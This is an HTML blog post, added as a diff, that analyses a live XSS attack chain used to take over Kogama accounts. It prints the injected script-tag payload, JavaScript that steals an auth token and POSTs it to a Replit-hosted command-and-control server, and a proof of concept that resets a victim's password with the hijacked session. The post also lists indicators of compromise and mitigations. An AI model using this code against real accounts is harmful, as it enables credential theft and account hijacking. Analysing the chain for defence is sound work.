@@ -1,0 +1,579 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>XSS Script Injection - Internet Past Midnight</title>
+    <link rel="icon" href="../graytest1.svg" type="image/svg+xml">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body {
+            background-color: #18181b;
+            color: #fff;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            margin: 0;
+            padding: 0;
+            line-height: 1.6;
+        }
+        header {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 30px 20px;
+            text-align: center;
+            position: relative;
+        }
+        header::after {
+            content: "";
+            position: absolute;
+            bottom: 0;
+            left: 20%;
+            width: 60%;
+            height: 1px;
+            background-color: #333;
+        }
+        .logo {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        .logo img {
+            height: 40px;
+            margin-bottom: 10px;
+            filter: drop-shadow(0 0 5px rgba(255, 255, 255, 0.1));
+        }
+        .logo a {
+            color: #fff;
+            text-decoration: none;
+            font-size: 1.2rem;
+            font-weight: 300;
+            letter-spacing: 0.5em;
+            margin: 0;
+        }
+        main {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+        .article-header {
+            margin-bottom: 30px;
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+        .back-button {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            cursor: pointer;
+            transition: transform 0.2s;
+            width: 40px;
+            text-align: center;
+        }
+        .back-button:hover {
+            transform: translateX(-3px);
+        }
+        .back-button svg {
+            width: 24px;
+            height: 24px;
+            fill: #777;
+            transition: fill 0.2s;
+        }
+        .back-button:hover svg {
+            fill: #aaa;
+        }
+        .back-button span {
+            color: #777;
+            font-size: 0.7rem;
+            margin-top: 2px;
+            transition: color 0.2s;
+        }
+        .back-button:hover span {
+            color: #aaa;
+        }
+        .article-header h1 {
+            font-size: 1.8rem;
+            margin-bottom: 10px;
+            flex: 1;
+        }
+        .article-header .date {
+            color: #777;
+            font-size: 0.9rem;
+            font-family: monospace;
+            width: 100%;
+            text-align: left;
+            margin-left: 60px;
+        }
+        .content {
+            line-height: 1.7;
+        }
+        .content p {
+            margin-bottom: 1.5em;
+        }
+        .content a {
+            color: #8ab4f8;
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+        .content a:hover {
+            color: #a6c8ff;
+            text-decoration: underline;
+        }
+        .content img, .content video {
+            max-width: 100%;
+            height: auto;
+            border-radius: 4px;
+            margin: 20px 0;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+        }
+        .content pre {
+            background-color: #1e1e1e;
+            padding: 15px;
+            border-radius: 4px;
+            overflow-x: auto;
+            margin: 20px 0;
+            font-family: 'Consolas', 'Monaco', monospace;
+            font-size: 0.9rem;
+            line-height: 1.5;
+        }
+        .content code {
+            font-family: 'Consolas', 'Monaco', monospace;
+            background-color: #2d2d2d;
+            padding: 2px 4px;
+            border-radius: 3px;
+            font-size: 0.9em;
+        }
+        .content blockquote {
+            border-left: 3px solid #444;
+            padding-left: 15px;
+            margin: 20px 0;
+            color: #ccc;
+            font-style: italic;
+        }
+        .ioc-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+        }
+        .ioc-table th, .ioc-table td {
+            padding: 10px;
+            text-align: left;
+            border-bottom: 1px solid #333;
+        }
+        .ioc-table th {
+            color: #8ab4f8;
+        }
+        .warning {
+            background-color: #2a1a1a;
+            border-left: 4px solid #ff4d4d;
+            padding: 15px;
+            margin: 20px 0;
+        }
+        .vulnerability {
+            background-color: #1e1e2e;
+            border-left: 4px solid #8b5cf6;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 0 4px 4px 0;
+        }
+        .vulnerability h3 {
+            margin-top: 0;
+            color: #8b5cf6;
+        }
+        .attack-chain {
+            background-color: #1a1c2a;
+            padding: 20px;
+            border-radius: 4px;
+            margin: 20px 0;
+        }
+        .attack-chain ol {
+            padding-left: 20px;
+        }
+        .attack-chain li {
+            margin-bottom: 10px;
+            position: relative;
+        }
+        .mitigation-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+        }
+        .mitigation-table th, .mitigation-table td {
+            padding: 12px;
+            text-align: left;
+            border-bottom: 1px solid #333;
+        }
+        .mitigation-table tr:nth-child(even) {
+            background-color: #222;
+        }
+        @media (max-width: 600px) {
+            main {
+                padding: 30px 15px;
+            }
+            .article-header {
+                gap: 15px;
+            }
+            .article-header h1 {
+                font-size: 1.5rem;
+            }
+            .back-button {
+                width: 30px;
+            }
+            .back-button svg {
+                width: 20px;
+                height: 20px;
+            }
+            .article-header .date {
+                margin-left: 45px;
+            }
+            .logo img {
+                height: 35px;
+            }
+            .logo a {
+                font-size: 1rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="logo">
+            <img src="../mooncat.svg" alt="Logo">
+            <a href="../">Internet Past Midnight</a>
+        </div>
+    </header>
+    
+    <main>
+        <div class="article-header">
+            <div class="back-button" onclick="window.location.href='../index.html'">
+                <svg viewBox="0 0 24 24">
+                    <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
+                </svg>
+                <span>back</span>
+            </div>
+            <div>
+                <h1>XSS Script Injection Chain</h1>
+                <p class="date">2025-06-24</p>
+            </div>
+        </div>
+        
+        <div class="content">
+            <div class="warning">
+                <p>⚠️ <strong>Warning</strong>: This attack chain is actively being used in the wild. Do not visit suspicious Kogama profiles without proper security measures.</p>
+            </div>
+
+            <h2>Executive Summary</h2>
+            <p>A sophisticated attack chain leveraging three distinct vulnerabilities was discovered targeting Kogama user accounts. This multi-stage attack combines XSS injection, API abuse, and authentication bypass techniques to achieve complete account takeover.</p>
+
+            <div class="attack-chain">
+                <h3>Attack Chain Overview</h3>
+                <ol>
+                    <li><strong>Initial Vector</strong>: Malicious script injection via avatar name field</li>
+                    <li><strong>Propagation</strong>: Automatic execution upon victim profile visit</li>
+                    <li><strong>Payload Delivery</strong>: Bit.ly shortened link to Pastebin-hosted malicious code</li>
+                    <li><strong>Credential Harvesting</strong>: Authentication token theft via API abuse</li>
+                    <li><strong>Persistence</strong>: Password reset bypass establishing attacker control</li>
+                </ol>
+            </div>
+
+            <div class="vulnerability" style="background-color: #629ace2a; border-left-color: #629ace;">
+                <h3>Initial Profile Preview</h3>
+                <img src="https://i.imgur.com/ofF7t3e.png" alt="ProfilePreview" style="max-width: 100%; border: 1px solid #ddd; margin-top: 10px;">
+                <p> <i>A glimpse of how the profile looked like before being taken down.</i></p>
+                <p>Visiting this specific profile caused the execution of payload.</p>
+            </div>
+            <div class="vulnerability" style="background-color: #ec916d2a; border-left-color: #ec916d8a;">
+                <h3>Primary Infection Vector:</h3>
+                <img src="https://i.imgur.com/teGePAm.png" alt="war4comments" style="max-width: 100%; border: 1px solid #ddd; margin-top: 10px;">
+                <p>The main spread mechanism occurred when third-party actors (people trying to be spiteful) shared the infected profile, ironically amused by its design—despite its malicious intent.</p>
+                <p>One of the examplary actors spreading it by a huge margin was Snowinvisible and his friends.</p>
+            </div>
+
+            <h2>Technical Analysis</h2>
+
+            <div class="vulnerability">
+                <h3>Vulnerability #1: XSS via Avatar Name Field</h3>
+                <p><strong>CWE Classification</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation</p>
+                
+                <p><strong>Malicious Payload</strong>:</p>
+                <pre><code>&lt;/script&gt;&lt;script src=//bit.ly/3GafoIi&gt;</code></pre>
+                
+                <p><strong>Injection Point</strong>: <code>avatar_name</code> field</p>
+                
+                <p><strong>Proof of Concept</strong>:</p>
+                <pre><code>"created_avatar": {
+                    "user_id": 25*****1,
+                    "username": "S*****b",
+                    "avatar_id": 31*****5,
+                    "images": {
+                        - - - - 
+                    },
+                    "avatar_name": "&lt;/script&gt;&lt;script src=//bit.ly/3GafoIi&gt;",
+                    "is_active": true
+                }</code></pre>
+                
+                <img src="https://i.imgur.com/lGILdrX.png" alt="XSS Exploit Proof" style="max-width: 100%; border: 1px solid #ddd; margin-top: 10px;">
+                <p><em>Image 1: Found XSS injection within profile's bootstrap.</em></p>
+                
+                <img src="https://i.imgur.com/Kc0WuYd.png" alt="New script tag visible in DevTools" style="max-width: 100%; border: 1px solid #ddd; margin-top: 10px;">
+                <p><em>Image 2: New script tag visible via Chrome DevTools after successful injection</em></p>
+                
+                <img src="https://i.imgur.com/J4GNZIc.png" alt="Hijacked profile functionality" style="max-width: 100%; border: 1px solid #ddd; margin-top: 10px;">
+                <p><em>Image 3: Profile page showing hijacked functionality - defaulting to another user's information</em></p>
+                
+                <p><strong>Bypass Technique</strong>:</p>
+                <ul>
+                    <li>Server-side limit: 45 characters</li>
+                    <li>Client-side limit: 30 characters</li>
+                    <li>Using a specialised cheat/tool to bypass length restrictions</li>
+                    <li>HTML context escape with script tag injection</li>
+                </ul>
+                <p> Our threat actor used a custom made tool to bypass the client limit of 30 characters to write up the entire XSS injection.</p>
+            </div>
+            <div class="vulnerability">
+                <h3>Vulnerability #2: Authentication Token Theft</h3>
+                
+                <p><strong>Malicious Payload</strong>:</p>
+                
+                <pre><code>let p = document.getElementsByName("Notify-Token")[0].content.split(".")[0];
+              let r = await fetch("https://www.kogama.com/api/onboarding/" + p + "/");
+              let d = await r.json();
+              fetch(
+                "https://03e7e540-e698-42ab-83ce-c26c9db19386-00-3h4m7rgh1fo65.kirk.replit.dev/test",
+                {
+                  method: "POST",
+                  headers: {
+                    Accept: "application/json, text/plain, */*",
+                    "Content-Type": "application/json",
+                  },
+                  body: JSON.stringify({ h: p, d }),
+                },
+              );</code></pre>
+              
+                <p><strong>Attack Flow</strong>:</p>
+                
+                <ol>
+                  <li>Extracts Notify-Token from meta tag</li>
+                  <li>Queries onboarding API with token fragment</li>
+                  <li>Exfiltrates sensitive auth data to attacker-controlled C2 server</li>
+                </ol>
+              
+                <p><strong>Proof of Concept</strong>:</p>
+                
+                <img src="https://i.imgur.com/tA1S3d9.png" 
+                     alt="Authentication Token Theft Proof" 
+                     style="max-width: 100%; border: 1px solid #ddd; margin-top: 10px;">
+                
+                <p class="image-caption">
+                  The response contains the full auth session token and user ID, demonstrating successful exfiltration.
+                </p>
+            </div>
+            <div class="vulnerability" style="background-color: #2a2a1e; border-left-color: #ffeb3b;">
+                <h3>C2 Server Functionality</h3>
+                <p><strong>Command and Control Operations</strong>:</p>
+                
+                <p>The attacker-controlled C2 server (hosted on Replit) serves multiple critical functions in the attack chain:</p>
+                
+                <ol>
+                    <li><strong>Data Exfiltration</strong>: Receives stolen authentication tokens and user data via POST requests</li>
+                    <li><strong>Password Reset Initiation</strong>: Generates random password strings for account takeover</li>
+                    <li><strong>Attack Coordination</strong>: Maintains persistence and coordinates timing of password changes</li>
+                </ol>
+                
+                <p><strong>Server Code Structure</strong>:</p>
+                <img src="https://i.imgur.com/Ib5Sw0T.png" alt="C2 Server Structure" style="max-width: 100%; border: 1px solid #ddd; margin-top: 10px;">
+                <p> <i>Credits to the creator of the exploit for giving us a glimpse into the code structure.</i></p>
+                
+                <p><strong>Operational Security</strong>:</p>
+                <ul>
+                    <li>Strict POST-only endpoint configuration</li>
+                    <li>No error message leakage (silent failure)</li>
+                    <li>Basic request validation but no rate limiting</li>
+                </ul>
+                
+                <img src="https://i.imgur.com/vszLhV5.png" alt="C2 server response example" style="max-width: 100%; border: 1px solid #ddd; margin-top: 10px;">
+                <p><em>Image: Author showcasing how one of my test responses looks like from their perspective.   </em></p>
+                
+                <p>The C2 server's lack of rate limiting allowed me to flood it with test requests during analysis, but its core functionality remained operational throughout the attack window.</p>
+            </div>
+            <div class="vulnerability">
+                <h3>Vulnerability #3: Password Reset Bypass</h3>
+                <p><strong>CWE Classification</strong>: CWE-620: Unverified Password Change</p>
+                
+                <div class="exploit-flow">
+                    <h4>Exploitation Flow</h4>
+                    <ol>
+                        <li>Extract Notify-Token from page metadata</li>
+                        <li>Query onboarding API to obtain full session token</li>
+                        <li>Generate random password via C2 server</li>
+                        <li>Execute password reset without old password verification</li>
+                    </ol>
+                </div>
+            
+                <div class="code-analysis">
+                    <h4>Payload Showcase</h4>
+                    <pre><code>let p = document.getElementsByName("Notify-Token")[0].content.split(".")[0];
+            
+            let r = await fetch("https://www.kogama.com/api/onboarding/" + p + "/");
+            let d = await r.json();
+            
+            const ID = p;
+            const session = d.authorization_session;
+            // using the snippet above we exploit onboarding API
+            // so we can obtain user auth_session + User ID for the request.
+
+            const password1 = "PASSWORD"; 
+            // This variable was defined within our C2 to be generated as a string, 
+            // this code is a proof of concept.
+            
+            async function ChangePassword(ID, password1, session) {
+              const url = "https://www.kogama.com/user/" + ID + "/password-reset-required";
+              
+              const data = {
+                password1,   // Due to a authorization bug regarding password reset field, 
+                password2: password1, // we do not need old password, but just the hijacked authsession
+              };
+            
+              let res = await fetch(url, {
+                method: "PUT",
+                headers: {
+                  "Content-Type": "application/json",
+                  "Authorization": `Bearer ${session}` // Hijacked authsession
+                },
+                body: JSON.stringify(data),
+              });
+              
+              return res.ok;
+            }</code></pre>
+                <p> Note that the original code is shorter, this is simply expanded to try and explain the structure.</p>
+                    <img src="https://i.imgur.com/ZaHm9QD.png" alt="DevTools showing successful password reset" style="max-width: 100%; border: 1px solid #ddd; margin: 15px 0;">
+                    <p><em>Image: Chrome DevTools showing successful 200 response from password reset endpoint</em></p>
+                </div>
+            
+                <div class="technical-details">
+                    <h4>Key Vulnerable Components</h4>
+                    <table class="ioc-table">
+                        <tr>
+                            <th>Element</th>
+                            <th>Vulnerability</th>
+                        </tr>
+                        <tr>
+                            <td><code>/password-reset-required</code> endpoint</td>
+                            <td>Accepts password changes without old password verification</td>
+                        </tr>
+                        <tr>
+                            <td>Authorization header</td>
+                            <td>No secondary validation checks</td>
+                        </tr>
+                        <tr>
+                            <td>Password complexity</td>
+                            <td>No server-side validation of new password</td>
+                        </tr>
+                    </table>
+                </div>
+            
+                <div class="impact">
+                    <h4>Impact Analysis</h4>
+                    <ul>
+                        <li><strong>Account Takeover</strong>: Full control with attacker-defined password</li>
+                        <li><strong>Persistence</strong>: Original credentials become invalid</li>
+                        <li><strong>Lateral Movement</strong>: Base for further platform exploitation</li>
+                    </ul>
+                </div>
+            
+                <div class="mitigation">
+                    <h4>Recommended Fixes</h4>
+                    <ul>
+                        <li>Implement mandatory <code>old_password</code> field for all reset requests</li>
+                        <li>Add multi-factor verification for password changes</li>
+                        <li>Log all password reset attempts with IP/device fingerprinting</li>
+                        <li>Rate limit sensitive API endpoints</li>
+                    </ul>
+                </div>
+            </div>
+
+            <h2>C2 Infrastructure Analysis</h2>
+            <table class="ioc-table">
+                <tr>
+                    <th>Component</th>
+                    <th>Details</th>
+                </tr>
+                <tr>
+                    <td>C2 Server</td>
+                    <td>Replit-hosted (03e7e540-e698-42ab-83ce-c26c9db19386-00-3h4m7rgh1fo65.kirk.replit.dev)</td>
+                </tr>
+                <tr>
+                    <td>Communication</td>
+                    <td>POST requests only, no error leakage</td>
+                </tr>
+                <tr>
+                    <td>Vulnerability</td>
+                    <td>No rate limiting (allows spam requests)</td>
+                </tr>
+            </table>
+
+            <h2>Mitigation Strategies</h2>
+            <table class="mitigation-table">
+                <tr>
+                    <th>Vulnerability</th>
+                    <th>Recommended Fix</th>
+                </tr>
+                <tr>
+                    <td>XSS Injection</td>
+                    <td>Implement proper HTML entity encoding for avatar_name field</td>
+                </tr>
+                <tr>
+                    <td>API Abuse</td>
+                    <td>Add CSRF tokens and strict content-type checking</td>
+                </tr>
+                <tr>
+                    <td>Password Reset</td>
+                    <td>Require old password confirmation for all changes</td>
+                </tr>
+                <tr>
+                    <td>C2 Communication</td>
+                    <td>Block known malicious domains at network level</td>
+                </tr>
+            </table>
+
+            <h2>Indicators of Compromise (IOCs)</h2>
+            <table class="ioc-table">
+                <tr>
+                    <th>Type</th>
+                    <th>Value</th>
+                </tr>
+                <tr>
+                    <td>Malicious URL</td>
+                    <td>bit.ly/3GafoIi (Pastebin payload)</td>
+                </tr>
+                <tr>
+                    <td>C2 Endpoint</td>
+                    <td>https://03e7e540-e698-42ab-83ce-c26c9db19386-00-3h4m7rgh1fo65.kirk.replit.dev/test</td>
+                </tr>
+                <tr>
+                    <td>Target Authsession Hijacking API</td>
+                    <td>https://www.kogama.com/api/onboarding/[notify-token]/</td>
+                </tr>
+                <tr>
+                    <td>Target Password Reset API</td>
+                    <td>https://www.kogama.com/user/ + [USERID]+ /password-reset-required/</td>
+                </tr>
+            </table>
+
+            <h2>Conclusion</h2>
+            <p>This attack chain demonstrates a sophisticated combination of front-end and back-end vulnerabilities being exploited in tandem. The attacker has shown deep understanding of Kogama's architecture by chaining:</p>
+            <ol>
+                <li>Client-side XSS injection</li>
+                <li>API endpoint abuse</li>
+                <li>Authentication flow bypass</li>
+            </ol>
+            <p>Immediate remediation should focus on input sanitization for profile fields and adding proper authentication checks for sensitive account operations.</p>
+
+            <div class="warning">
+                <h3>Update</h3>
+                <p>As of analysis date, the C2 server has been succesfuly taken down as well as the original pastebin payload. However, this was just one sample out of much more that can occur. Stay safe and vigilant.</p>
+            </div>
+        </div>
+    </main>
+</body>
+</html>
